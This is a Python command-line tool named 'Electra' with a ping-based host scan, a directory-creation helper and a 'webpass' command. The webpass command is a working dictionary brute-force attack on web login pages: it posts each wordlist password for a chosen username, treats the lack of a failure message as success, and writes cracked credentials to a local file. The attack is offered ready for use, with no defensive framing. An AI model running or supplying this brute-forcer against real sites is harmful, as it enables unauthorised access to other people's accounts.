#!/usr/bin/env python3
import click, sys, os, socket, requests

BANNER = """
███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
██╔════╝██║     ██╔════╝██╔════╝╚══██╔══╝██╔══██ ██╔══██╗
█████╗  ██║     █████╗  ██║        ██║   █████╔╝ ███████║
██╔══╝  ██║     ██╔══╝  ██║        ██║   ██  ██╗ ██╔══██║
███████╗███████╗███████╗╚██████╗   ██║   ██║  ██╗██║  ██║
═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.0

Electra - The master plan plotter.
"""

class BannerGroup(click.Group):
    def get_help(self, ctx):
        click.echo(BANNER)
        return super().get_help(ctx)
    
    def format_commands(self, ctx, formatter):
        commands = [
            ("sscan", "Perform a system scan."),
            ("cdir", "Create a new directory in a specified path."),
            ("webpass", "Web Dictionary Password Brute Force Attack.")
        ]
        with formatter.section("Commands"):
            for cmd, desc in commands:
                formatter.write_text(f"{cmd:<10} {desc}")
        #return super().format_commands(ctx, formatter)
    
@click.group(cls=BannerGroup)
@click.option("-h", "--help", is_flag=True, expose_value=False, is_eager=True, callback=lambda ctx, param, value: click.echo(ctx.get_help()) if value else None, help="Show this help message and exit.")
def cli():
    click.echo(BANNER)

@cli.command()
@click.option("-h", "--hostname", required=True, prompt="Hostname", help="Hostname of the system to scan.")
def sscan(hostname):
    click.echo(click.style(f"[*] Starting system scan for host: {hostname}", fg="blue"))
    try:
        #Resolve IP of the host
        ip = socket.gethostbyname(hostname)
        click.echo(click.style(f"[!] Resolved IP address: {ip}", fg="green"))
        #Perform ping test
        response = os.system(f"ping -c 4 {ip}")
        if response == 0:
            click.echo(click.style(f"[!] Host: {hostname} with IP address: {ip} is reachable.", fg="green"))
        else:
            click.echo(click.style(f"[!] Host: {hostname} with IP address: {ip} is not reachable.", fg="red"))
    
    except socket.gaierror:
        click.echo(click.style(f"[!] Error: Hostname: {hostname} could not be resolved.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

@cli.command()
@click.option("-n", "--name", default="Directory", prompt="Enter dir name", help="Name of the directory to create. Default name is 'Directory'.")
@click.option("-p", "--path", default=None, help="Path where the directory should be created. Default is current working directory.")
def cdir(name, path):
    #Check whether OS is Linux
    if os.name != "posix":
        click.echo(click.style("[~] This function is only supported on Linux systems.", fg="magenta"))
        return
    
    #Set default path
    if not path:
        path = os.getcwd()
        click.echo(click.style(f"[~] No path specified. Using current directory: {path}", fg="magenta"))
    
    #Construct the full directory path
    full_path = os.path.join(path, name)

    try:
        os.makedirs(full_path, exist_ok=True)
        click.echo(click.style(f"[!] Dir: '{name}' created successfully at {full_path}", fg="green"))
    except PermissionError:
        click.echo(click.style("[!] Error: Permission denied. Try running with elevated privileges.", fg="red"))
    except FileExistsError:
        click.echo(click.style("[!] Error: Dir already exists.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

@cli.command()
@click.option("-u", "--url", prompt="Target URL", help="URL of the target authentication page.")
@click.option("-U", "--username", prompt="Username", help="Username for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), prompt="Wordlist path", help="Path to the password wordlist.")
def webpass(url, username, wordlist):
    click.echo(click.style(f"[*] Starting password wordlist BF attack on: {url} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for password in file:
                password = password.strip()
                response = requests.post(url, data={"username": username, "password": password})
                if "login failed! invalid username or password." not in response.text.lower(): #invalid einai to failure http response tis selidas
                    click.echo(click.style(f"[!] Found password: {password}", fg="green"))
                    #Save password to a file
                    with open("Electra-Found-Passwords.txt", "a") as found_passwords:
                        found_passwords.write(f"URL: {url}, Username: {username}, Password: {password}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Attempt with password: '{password}' failed.", fg="red"))
        
        click.echo(click.style("[!] Web Password Wordlist BF attack completed. No valid passwords found.", fg="magenta"))
    
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))

if __name__ == "__main__":
    cli()